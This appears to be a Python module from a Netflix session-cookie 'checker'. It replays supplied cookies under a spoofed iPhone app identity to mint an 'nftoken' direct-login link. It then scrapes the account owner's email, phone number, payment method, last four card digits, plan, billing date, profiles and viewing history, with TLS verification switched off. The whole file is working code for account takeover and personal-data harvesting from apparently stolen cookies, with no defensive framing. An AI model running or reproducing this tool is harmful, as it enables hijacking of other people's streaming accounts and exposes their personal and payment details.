import aiohttp
import asyncio
import json
import re
import html
import urllib.parse
from datetime import datetime, timezone, timedelta
import ssl
import logging
from deep_translator import GoogleTranslator

def _translate_to_english(text: str) -> str:
    if not text or text == "N/A":
        return text
    try:
        return GoogleTranslator(source='auto', target='en').translate(text)
    except Exception:
        return text

logger = logging.getLogger(__name__)

COUNTRY_CODES = {
    "US": "United States", "GB": "United Kingdom", "CA": "Canada", "AU": "Australia", "IN": "India",
    "BR": "Brazil", "FR": "France", "DE": "Germany", "IT": "Italy", "ES": "Spain", "MX": "Mexico",
    "JP": "Japan", "KR": "South Korea", "NL": "Netherlands", "SE": "Sweden", "CH": "Switzerland",
    "AR": "Argentina", "CO": "Colombia", "CL": "Chile", "PE": "Peru", "TR": "Turkey", "ZA": "South Africa",
    "RU": "Russia", "SG": "Singapore", "MY": "Malaysia", "PH": "Philippines", "ID": "Indonesia",
    "TH": "Thailand", "VN": "Vietnam", "TW": "Taiwan", "HK": "Hong Kong", "NZ": "New Zealand",
    "IE": "Ireland", "NO": "Norway", "DK": "Denmark", "FI": "Finland", "PT": "Portugal", "GR": "Greece",
    "AT": "Austria", "BE": "Belgium", "PL": "Poland", "CZ": "Czech Republic", "HU": "Hungary",
    "RO": "Romania", "UA": "Ukraine", "IL": "Israel", "AE": "United Arab Emirates", "SA": "Saudi Arabia",
    "EG": "Egypt", "MA": "Morocco", "NG": "Nigeria", "KE": "Kenya", "LT": "Lithuania", "LV": "Latvia",
    "EE": "Estonia", "RS": "Serbia", "HR": "Croatia", "SI": "Slovenia", "SK": "Slovakia", "BG": "Bulgaria"
}

def get_country_with_flag(code):
    if not code or code == "N/A" or len(code) != 2:
        return code
    code = code.upper()
    flag = chr(ord(code[0]) + 127397) + chr(ord(code[1]) + 127397)
    name = COUNTRY_CODES.get(code, code)
    return f"{name} {flag}"

NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
}

def decode_netflix_value(value):
    if value is None: return None
    cleaned = html.unescape(str(value))
    cleaned = cleaned.replace("\\/", "/").replace('\\"', '"').replace("\\n", " ").replace("\\t", " ")
    cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), cleaned)
    cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), cleaned)
    if "%" in cleaned:
        try:
            cleaned = urllib.parse.unquote(cleaned)
        except Exception:
            pass
    return cleaned.strip() or None

def parse_boolean_value(value):
    if isinstance(value, bool): return value
    if isinstance(value, (int, float)): return value == 1
    cleaned = decode_netflix_value(value)
    if not cleaned: return None
    low = cleaned.lower()
    if low in {"true", "yes", "1", "on"}: return True
    if low in {"false", "no", "0", "off"}: return False
    return None

def format_boolean_label(value):
    parsed = parse_boolean_value(value)
    if parsed is True: return "Yes"
    if parsed is False: return "No"
    return None

def extract_first_match(text, patterns):
    for p in patterns:
        m = re.search(p, text)
        if m: return decode_netflix_value(m.group(1))
    return None

def extract_bool_value(text, patterns):
    val = extract_first_match(text, patterns)
    return format_boolean_label(val) if val else None

def extract_profile_names(text):
    names = []
    # Try GraphQL
    for m in re.finditer(r'"profileName"\s*:\s*"([^"]+)"', text):
        d = decode_netflix_value(m.group(1))
        if d and d not in names: names.append(d)
        
    # Fallback to HTML buttons for profiles
    html_names = []
    for m in re.finditer(r'<button[^>]*aria-label="([^"]+)"[^>]*data-cl-view="accountProfileSettings"', text):
        d = decode_netflix_value(m.group(1))
        if d and d not in html_names: html_names.append(d)
        
    if len(html_names) > len(names):
        names = html_names
        
    if not names: return None
    return f"{', '.join(names)} ({len(names)})"

def extract_info_from_graphql(response_text):
    info = {
        "accountOwnerName": extract_first_match(response_text, [
            r'userInfo"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"',
            r'"accountOwnerName"\s*:\s*"([^"]+)"',
            r'"name"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"'
        ]),
        "email": extract_first_match(response_text, [
            r'"emailAddress"\s*:\s*"([^"]+)"',
            r'"email"\s*:\s*"([^"]+)"',
            r'"loginId"\s*:\s*"([^"]+)"'
        ]),
        "countryOfSignup": extract_first_match(response_text, [
            r'"currentCountry"\s*:\s*"([^"]+)"',
            r'"countryOfSignup":\s*"([^"]+)"'
        ]),
        "memberSince": extract_first_match(response_text, [r'"memberSince":\s*"([^"]+)"']),
        "nextBillingDate": extract_first_match(response_text, [
            r'"nextBillingDate"\s*:\s*"([^"]+)"',
            r'"nextBillingDate"\s*:\s*\{[^}]*?"value"\s*:\s*"([^"]+)"',
            r'"nextBillingDate"\s*:\s*\{[^}]*?"formattedDate"\s*:\s*"([^"]+)"',
            r'"nextBilling"\s*:\s*\{[^}]*?"value"\s*:\s*"([^"]+)"',
            r'data-uia="account-overview-page\+membership-card\+description"[^>]*>[^:]*:\s*([^<]+)'
        ]),
        "showExtraMemberSection": extract_bool_value(response_text, [
            r'"showExtraMemberSection":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
            r'"showExtraMemberSection"\s*:\s*(true|false)'
        ]),
        "membershipStatus": extract_first_match(response_text, [r'"membershipStatus":\s*"([^"]+)"']),
        "maxStreams": extract_first_match(response_text, [
            r'maxStreams":\{"fieldType":"Numeric","value":([^,]+),',
            r'"maxStreams"\s*:\s*"?([^",}]+)"?'
        ]),
        "localizedPlanName": extract_first_match(response_text, [
            r'localizedPlanName":\{"fieldType":"String","value":"([^"]+)"',
            r'"localizedPlanName"\s*:\s*"([^"]+)"',
            r'"planName"\s*:\s*"([^"]+)"',
            r'"currentPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"',
            r'"MemberPlan"\s*,\s*"fields"\s*:\s*\{\s*"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'"growthAccount"[\s\S]{0,500}?"currentPlan"[\s\S]{0,200}?"name"\s*:\s*"([^"]+)"'
        ]),
        "planPrice": extract_first_match(response_text, [
            r'"formattedPlanPrice"\s*:\s*"([^"]+)"',
            r'"formattedPrice"\s*:\s*"([^"]+)"',
            r'"planPrice"\s*:\s*"([^"]+)"',
            r'"planPriceDisplay"\s*:\s*"([^"]+)"'
        ]),
        "paymentMethodType": extract_first_match(response_text, [
            r'"paymentMethod"\s*:\s*"([^"]+)"',
            r'"paymentType"\s*:\s*"([^"]+)"',
            r'"paymentMethodType"\s*:\s*"([^"]+)"',
            r'"paymentOptionLogo"\s*:\s*"([^"]+)"',
            r'"paymentOptionLogo"\s*:\s*\{[^}]*?"paymentOptionLogo"\s*:\s*"([^"]+)"',
            r'"payer"\s*:\s*"([^"]+)"',
            r'data-uia="account-overview-page\+membership-card\+payment\+details-icon"[^>]*src="[^"]+/([^/.]+)\.png"',
            r'data-uia="payment-mop-icon"[^>]*alt="([^"]+)"',
            r'data-uia="account-overview-page\+membership-card\+subtitle-free-trial"[^>]*>\s*([^<]+)\s*</span>'
        ]),
        "maskedCard": extract_first_match(response_text, [
            r'"paymentMethodLast4"\s*:\s*"([^"]+)"',
            r'"lastFour"\s*:\s*"([^"]+)"',
            r'"maskedCard"\s*:\s*"([^"]+)"',
            r'"__typename"\s*:\s*"GrowthCardPaymentMethod"[^}]*?"displayText"\s*:\s*"([^"]+)"',
            r'"growthPaymentMethods"[\s\S]{0,150}?"displayText"\s*:\s*"([^"]+)"',
            r'data-uia="account-overview-page\+membership-card\+payment\+details"[^>]*>.*?(?:••••|\*+)\s*(\d{4})'
        ]),
        "phoneNumber": extract_first_match(response_text, [
            r'"phoneNumberDigits"\s*:\s*\{[\s\S]*?"value"\s*:\s*"([^"]+)"',
            r'"phoneNumber"\s*:\s*"([^"]+)"',
            r'"mobilePhone"\s*:\s*"([^"]+)"'
        ]),
        "phoneVerified": extract_bool_value(response_text, [
            r'"phoneVerified"\s*:\s*(true|false)',
            r'"isPhoneVerified"\s*:\s*(true|false)',
            r'"rawPhoneNumber"\s*:\s*\{[^}]*?"isVerified"\s*:\s*(true|false)'
        ]),
        "videoQuality": extract_first_match(response_text, [
            r'videoQuality"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'"videoQuality"\s*:\s*"([^"]+)"',
            r'"quality"\s*:\s*"([^"]+)"'
        ]),
        "holdStatus": extract_bool_value(response_text, [
            r'"holdStatus"\s*:\s*(true|false)',
            r'"isUserOnHold"\s*:\s*(true|false)',
            r'"isOnHold"\s*:\s*(true|false)'
        ]),
        "emailVerified": extract_bool_value(response_text, [
            r'"isEmailVerified"\s*:\s*(true|false)',
            r'"emailVerified"\s*:\s*(true|false)',
            r'"growthEmail"\s*:\s*\{[^}]*?"isVerified"\s*:\s*(true|false)',
            r'"email"\s*:\s*\{[^}]*?"isVerified"\s*:\s*(true|false)'
        ]),
        "profiles": extract_profile_names(response_text),
        "isFreeTrial": bool(re.search(r'data-uia="account-overview-page\+membership-card\+subtitle-free-trial"|membershipStatus"\s*:\s*"FREE_TRIAL"', response_text))
    }
    
    if info.get("maskedCard") and re.fullmatch(r"\d{4}", info["maskedCard"]):
        if info.get("paymentMethodType") in {None, "", "Yes"}:
            info["paymentMethodType"] = "CC"
            
    return {k: v for k, v in info.items() if v is not None}

async def generate_direct_login_link_api(cookies_list):
    cookie_str = "; ".join([f"{c['name']}={decode_netflix_value(c['value'])}" for c in cookies_list])
    
    if "NetflixId" not in cookie_str:
        return "NO_NFTOKEN_FOUND"
        
    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = cookie_str
    
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS, headers=headers, ssl=ssl_ctx, timeout=30) as resp:
                if resp.status == 403:
                    return "ERROR"
                elif resp.status != 200:
                    return "ERROR"
                data = await resp.json()
                
                token_data = (
                    (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
                    or {}
                )
                token = decode_netflix_value(token_data.get("token"))
                if token:
                    return f"https://netflix.com/?nftoken={token}"
    except Exception as e:
        logger.error(f"Error fetching nftoken: {e}")
        return "ERROR"
        
    return "NO_NFTOKEN_FOUND"

async def fetch_enhanced_account_details(cookies_list):
    cookie_str = "; ".join([f"{c['name']}={decode_netflix_value(c['value'])}" for c in cookies_list])
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Cookie": cookie_str
    }
    
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://www.netflix.com/account/membership", headers=headers, ssl=ssl_ctx, timeout=20) as resp:
                html_text = await resp.text()
                
                info1 = extract_info_from_graphql(html_text)
                
                # Fetch fallback page
                async with session.get("https://www.netflix.com/account", headers=headers, ssl=ssl_ctx, timeout=20) as resp2:
                    html_text2 = await resp2.text()
                    info2 = extract_info_from_graphql(html_text2)
                    
                # Fetch profiles page just in case
                async with session.get("https://www.netflix.com/account/profiles", headers=headers, ssl=ssl_ctx, timeout=20) as resp_prof:
                    html_prof = await resp_prof.text()
                    info_prof = extract_info_from_graphql(html_prof)
                    
                    # Merge info2 and info_prof into info1
                    
                    for k, v in info2.items():
                        if k not in info1:
                            info1[k] = v
                            
                    # Explicitly merge profiles from the profiles page if they are better
                    prof_from_prof_page = info_prof.get('profiles')
                    if prof_from_prof_page and (not info1.get('profiles') or len(prof_from_prof_page) > len(info1.get('profiles', ''))):
                        info1['profiles'] = prof_from_prof_page
                
                # Fetch security page to accurately determine email and phone verification status
                try:
                    async with session.get("https://www.netflix.com/account/security", headers=headers, ssl=ssl_ctx, timeout=20) as resp_sec:
                        if resp_sec.status == 200:
                            html_sec = await resp_sec.text()
                            
                            # 1. Parse any GraphQL JSON first
                            info_sec = extract_info_from_graphql(html_sec)
                            if info_sec.get('emailVerified') is not None:
                                info1['emailVerified'] = info_sec['emailVerified']
                            if info_sec.get('phoneVerified') is not None:
                                info1['phoneVerified'] = info_sec['phoneVerified']
                                
                            # 2. Hard HTML fallback check for phone
                            if info1.get('phoneVerified') is None:
                                m_phone = re.search(r'data-uia="account-security-page\+account-details-card\+phone"[^>]*>([\s\S]{0,5000}?)</a>', html_sec, re.IGNORECASE)
                                if m_phone:
                                    phone_html = m_phone.group(1)
                                    # Strip SVG and complex HTML before translation to reduce payload
                                    clean_html = re.sub(r'<[^>]+>', ' ', phone_html)
                                    translated_phone = _translate_to_english(clean_html).lower()
                                    if 'needs verification' in translated_phone or 'verify' in translated_phone or 'verific' in translated_phone or 'unverified' in translated_phone:
                                        info1['phoneVerified'] = "No"
                                    elif info1.get('phoneNumber') and info1.get('phoneNumber') != 'N/A':
                                        info1['phoneVerified'] = "Yes"
                                    else:
                                        info1['phoneVerified'] = "N/A"
                                        
                            # 3. Hard HTML fallback check for email
                            if info1.get('emailVerified') is None:
                                m_email = re.search(r'data-uia="account-security-page\+account-details-card\+email"[^>]*>([\s\S]{0,5000}?)</a>', html_sec, re.IGNORECASE)
                                if m_email:
                                    email_html = m_email.group(1)
                                    clean_html = re.sub(r'<[^>]+>', ' ', email_html)
                                    translated_email = _translate_to_english(clean_html).lower()
                                    if 'needs verification' in translated_email or 'verify' in translated_email or 'verific' in translated_email or 'unverified' in translated_email:
                                        info1['emailVerified'] = "No"
                                    elif info1.get('email') and info1.get('email') != 'N/A':
                                        info1['emailVerified'] = "Yes"
                                    else:
                                        info1['emailVerified'] = "N/A"
                except Exception as e:
                    logger.error(f"Error fetching security page: {e}")
                
                payment_method = info1.get('paymentMethodType', 'N/A')
                masked_card = info1.get('maskedCard', 'N/A')
                
                package_str = payment_method
                if masked_card != 'N/A' and masked_card:
                    if package_str == 'N/A':
                        package_str = masked_card
                    else:
                        package_str += f" {masked_card}"
                
                if package_str == 'N/A' and info1.get('isFreeTrial'):
                    package_str = "Free Trial"
                    
                extra_mems = info1.get('showExtraMemberSection')
                if extra_mems == 'Yes':
                    extra_mems_str = "Yes ✅"
                elif extra_mems == 'No':
                    extra_mems_str = "No ❌"
                else:
                    extra_mems_str = "N/A"
                    
                # Fetch viewing activity
                last_viewed_date = "N/A"
                try:
                    async with session.get("https://www.netflix.com/viewingactivity", headers=headers, ssl=ssl_ctx, timeout=15) as resp3:
                        if resp3.status == 200:
                            html_text3 = await resp3.text()
                            
                            # Try HTML first as it's more reliable for exact title binding
                            html_m = re.search(r'<div[^>]*class="[^"]*date[^"]*"[^>]*>\s*([^<]+)\s*</div>[\s\S]{0,150}?<a[^>]*>([^<]+)</a>', html_text3)
                            if html_m:
                                last_viewed_date = f"{decode_netflix_value(html_m.group(1))} - {decode_netflix_value(html_m.group(2))}"
                            else:
                                # JSON fallback
                                m = re.search(r'\{[^{}]*?"dateStr"\s*:\s*"([^"]+)"[^{}]*?"(?:title|movieTitle|videoTitle)"\s*:\s*"([^"]+)"', html_text3)
                                if m:
                                    last_viewed_date = f"{decode_netflix_value(m.group(1))} - {decode_netflix_value(m.group(2))}"
                                else:
                                    # Fallback to date only
                                    for pat in [r'"dateStr"\s*:\s*"([^"]+)"', r'"date"\s*:\s*"(\d{1,2}/\d{1,2}/\d{2,4})"']:
                                        m = re.search(pat, html_text3)
                                        if m:
                                            last_viewed_date = decode_netflix_value(m.group(1).strip())
                                            break
                except Exception as e:
                    logger.error(f"Error fetching viewing activity: {e}")
                    
                result = {
                    'plan': info1.get('localizedPlanName', 'N/A'),
                    'email': info1.get('email', 'N/A'),
                    'phone_number': info1.get('phoneNumber', 'N/A'),
                    'member_since': info1.get('memberSince', 'N/A'),
                    'country': get_country_with_flag(info1.get('countryOfSignup', 'N/A')),
                    'profiles': info1.get('profiles', 'N/A'),
                    'video_quality': info1.get('videoQuality', 'N/A'),
                    'max_streams': info1.get('maxStreams', 'N/A'),
                    'next_billing': info1.get('nextBillingDate', 'N/A'),
                    'payment_method': payment_method,
                    'masked_card': masked_card,
                    'package': package_str,
                    'extra_members': extra_mems_str,
                    'last_viewed': last_viewed_date,
                    'email_verified': "✅ Verified" if info1.get('emailVerified') in ("Yes", "true", True) or str(info1.get('emailVerified')).lower() in ("yes", "sí", "oui", "ja", "sim", "evet", "true") else ("❌ Non-verified" if info1.get('emailVerified') in ("No", "false", False) or str(info1.get('emailVerified')).lower() in ("no", "non", "nein", "não", "hayır", "false") else "N/A"),
                    'phone_verified': "✅ Verified" if info1.get('phoneVerified') in ("Yes", "true", True) or str(info1.get('phoneVerified')).lower() in ("yes", "sí", "oui", "ja", "sim", "evet", "true") else ("❌ Non-verified" if info1.get('phoneVerified') in ("No", "false", False) or str(info1.get('phoneVerified')).lower() in ("no", "non", "nein", "não", "hayır", "false") else "N/A"),
                    'has_dvd': False
                }
                
                # Package name fallback if localizedPlanName is missing
                if result['plan'] == 'N/A' and result['video_quality'] != 'N/A':
                    result['plan'] = f"{result['video_quality']} Plan"
                elif result['plan'] != 'N/A':
                    # Translate plan
                    result['plan'] = _translate_to_english(result['plan'])
                    
                # Translate other fields
                if result['member_since'] != 'N/A':
                    result['member_since'] = _translate_to_english(result['member_since'])
                if result['next_billing'] != 'N/A':
                    result['next_billing'] = _translate_to_english(result['next_billing'])
                if result['last_viewed'] != 'N/A' and result['last_viewed'] != 'Unable to fetch':
                    result['last_viewed'] = _translate_to_english(result['last_viewed'])
                if result['package'] != 'N/A':
                    result['package'] = _translate_to_english(result['package'])                    
                return result
    except Exception as e:
        logger.error(f"Error fetching account info: {e}")
        return {}
